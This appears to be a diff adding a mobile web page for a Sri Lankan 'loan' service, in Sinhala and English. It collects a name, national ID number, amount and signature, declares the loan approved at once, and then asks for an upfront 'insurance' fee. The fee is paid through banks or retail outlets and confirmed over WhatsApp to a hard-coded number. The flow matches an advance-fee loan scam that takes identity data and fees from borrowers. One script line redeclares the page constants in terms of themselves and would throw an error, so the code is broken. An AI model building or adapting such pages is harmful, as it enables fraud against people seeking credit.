@@ -1,1 +1,237 @@
+<!DOCTYPE html>
+<html lang="si">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>EzC Signature App</title>
 
+<style>
+*{box-sizing:border-box}
+body{margin:0;font-family:system-ui;background:#eaeef3}
+.app{max-width:420px;margin:auto;min-height:100vh;background:#fff}
+.page{padding:16px}
+h3{text-align:center}
+
+label{display:block;margin-top:14px;font-weight:600}
+input,button{
+ width:100%;padding:14px;margin-top:10px;
+ border-radius:12px;font-size:16px
+}
+input{border:1px solid #ccc}
+button{border:none;color:#fff;background:#27ae60}
+
+.clear-btn{background:#e74c3c}
+.pay-btn{background:#2980b9}
+.whatsapp-btn{background:#25D366}
+.help-btn{background:#7f8c8d}
+
+canvas{
+ width:100%;height:160px;border:2px dashed #aaa;
+ border-radius:12px;margin-top:8px
+}
+
+.statement{
+ margin-top:12px;padding:12px;
+ background:#f4f6f8;border-radius:12px;font-size:14px
+}
+
+.option-btn{
+ background:#34495e;margin-top:10px
+}
+
+.option-btn.active{
+ background:#27ae60
+}
+
+#page2,#page3{display:none}
+
+#popup{
+ position:fixed;inset:0;background:rgba(0,0,0,.4);
+ display:flex;align-items:center;justify-content:center;
+ opacity:0;pointer-events:none;transition:.25s
+}
+#popup.active{opacity:1;pointer-events:auto}
+.popup-box{
+ background:#fff;padding:20px;width:85%;
+ max-width:320px;border-radius:14px;text-align:center
+}
+</style>
+</head>
+
+<body>
+<div class="app">
+
+<!-- PAGE 1 -->
+<div class="page" id="page1">
+<h3>Customer Details</h3>
+
+<label>Name</label>
+<input id="name">
+
+<label>NIC</label>
+<input id="nic">
+
+<label>Amount (Rs)</label>
+<input type="number" id="amount">
+
+<div class="statement">
+මා විසින් ලබාගන්නා මෙම මුදල, ඉහත ලේඛනයේ සඳහන් පොලී අනුපාතයන්ට එකඟව මුදල් ගෙවන බවට මෙයින් පොරොන්දු වෙමි.
+</div>
+
+<label>Signature</label>
+<canvas id="sign"></canvas>
+<button class="clear-btn" onclick="clearSign()">Clear Signature</button>
+
+<button onclick="goNext()">Next</button>
+</div>
+
+<!-- PAGE 2 -->
+<div class="page" id="page2">
+<h3>Loan Approved</h3>
+
+<p><b>Customer ID:</b> <span id="customerId"></span></p>
+<p><b>Requested Amount:</b> Rs. <span id="showAmount"></span></p>
+<p><b>Insurance Payment:</b> Rs. <span id="insurance"></span></p>
+
+<label>Upload Receipt</label>
+<input type="file" id="receipt" accept="image/*">
+
+<button onclick="submitForm()">Submit</button>
+
+<button class="pay-btn" onclick="goPaymentPage()">Pay Now</button>
+</div>
+
+<!-- PAGE 3 -->
+<div class="page" id="page3">
+<h3>ඔබ ගෙවීම කරන්නෙ කොහොමද?</h3>
+
+<button class="option-btn" onclick="selectType('Online')">Online හරහා ගෙවීම</button>
+<button class="option-btn" onclick="selectType('Cash')">Cash payment (පිටතින්)</button>
+
+<div id="onlineOptions" style="display:none">
+<button class="option-btn" onclick="selectMethod('Sampath Vishwa')">Sampath Vishwa</button>
+<button class="option-btn" onclick="selectMethod('BOC Flex')">BOC Flex</button>
+<button class="option-btn" onclick="selectMethod('Commercial App')">Commercial App</button>
+<button class="option-btn" onclick="selectMethod('NSB Pay')">NSB Pay</button>
+</div>
+
+<div id="cashOptions" style="display:none">
+<button class="option-btn" onclick="selectMethod('Food City')">Food City</button>
+<button class="option-btn" onclick="selectMethod('Communication')">Communication</button>
+<button class="option-btn" onclick="selectMethod('Dialog Arcade')">Dialog Arcade</button>
+<button class="option-btn" onclick="selectMethod('Cargills')">Cargills</button>
+<button class="option-btn" onclick="selectMethod('Singer')">Singer</button>
+</div>
+
+<button onclick="confirmPayment()">Confirm & WhatsApp</button>
+<button class="help-btn" onclick="sendHelp()">උදව් / Help</button>
+</div>
+
+</div>
+
+<!-- POPUP -->
+<div id="popup">
+<div class="popup-box">
+<div id="popupText"></div>
+<button onclick="popup.classList.remove('active')">OK</button>
+</div>
+</div>
+
+<script>
+const WHATSAPP_NO="94742089009";
+
+const page1=page1,page2=page2,page3=page3;
+const popup=document.getElementById("popup");
+const popupText=document.getElementById("popupText");
+
+let AUTO_CUSTOMER_ID="";
+let paymentType="";
+let paymentMethod="";
+
+/* POPUP */
+function showPopup(msg){
+ popupText.innerText=msg;
+ popup.classList.add("active");
+}
+
+/* CUSTOMER ID */
+function generateCustomerId(){
+ const d=new Date();
+ return `EZC-${d.getTime()}`;
+}
+
+/* INSURANCE */
+function calculateInsurance(a){
+ if(a<=30000)return 2000;
+ if(a<=40000)return 2500;
+ if(a<=50000)return 3000;
+ return 3500;
+}
+
+/* SIGN */
+const c=document.getElementById("sign");
+const ctx=c.getContext("2d");
+let draw=false;
+c.onpointerdown=e=>{draw=true;ctx.beginPath();ctx.moveTo(e.offsetX,e.offsetY)}
+c.onpointermove=e=>{if(draw){ctx.lineTo(e.offsetX,e.offsetY);ctx.stroke()}}
+c.onpointerup=()=>draw=false;
+function clearSign(){ctx.clearRect(0,0,c.width,c.height)}
+
+/* PAGE FLOW */
+function goNext(){
+ if(!name.value||!nic.value||!amount.value){
+  showPopup("කරුණාකර සියලු fields පුරවන්න");return;
+ }
+ AUTO_CUSTOMER_ID=generateCustomerId();
+ customerId.innerText=AUTO_CUSTOMER_ID;
+ showAmount.innerText=amount.value;
+ insurance.innerText=calculateInsurance(amount.value);
+ page1.style.display="none";
+ page2.style.display="block";
+}
+
+function submitForm(){
+ if(!receipt.files.length){
+  showPopup("Receipt upload කරන්න");return;
+ }
+ showPopup("Receipt uploaded");
+}
+
+function goPaymentPage(){
+ page2.style.display="none";
+ page3.style.display="block";
+}
+
+/* PAYMENT PAGE */
+function selectType(type){
+ paymentType=type;
+ paymentMethod="";
+ onlineOptions.style.display= type==="Online"?"block":"none";
+ cashOptions.style.display= type==="Cash"?"block":"none";
+}
+
+function selectMethod(m){
+ paymentMethod=m;
+}
+
+function confirmPayment(){
+ if(!paymentType || !paymentMethod){
+  showPopup("Payment method select කරන්න");
+  return;
+ }
+ const msg=`Payment Details ✅
+Customer ID: ${AUTO_CUSTOMER_ID}
+Payment Type: ${paymentType}
+Payment Method: ${paymentMethod}
+Amount: Rs.${showAmount.innerText}
+Insurance: Rs.${insurance.innerText}`;
+ window.open(`https://wa.me/${WHATSAPP_NO}?text=${encodeURIComponent(msg)}`);
+}
+
+function sendHelp(){
+ const msg="ගෙවීම කරන විදිය පැහැදිලි නැහැ. කරුණාකර උදව් කරන්න.";
+ window.open(`https://wa.me/${WHATSAPP_NO}?text=${encodeURIComponent(msg)}`);
+}
+</script>
+</body>
+</html>
